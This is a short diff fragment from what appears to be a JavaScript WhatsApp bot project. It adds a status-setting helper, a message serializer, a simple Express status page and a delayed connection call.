+                    ...opts,
+                },
+                { quoted },
+            );
+        };
+
+        // Status aka brio
+        conn.setStatus = status => {
+            conn.query({
+                tag: 'iq',
+                attrs: {
+                    to: '@s.whatsapp.net',
+                    type: 'set',
+                    xmlns: 'status',
+                },
+                content: [
+                    {
+                        tag: 'status',
+                        attrs: {},
+                        content: Buffer.from(status, 'utf-8'),
+                    },
+                ],
+            });
+            return status;
+        };
+    conn.serializeM = mek => sms(conn, mek, store);
+  }
+  
+  app.get("/", (req, res) => {
+  res.send("GARFIELD-WHATSAPP-BOT-v10 STARTED ✅");
+  });
+  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
+  setTimeout(() => {
+  connectToWA()
+  }, 4000);
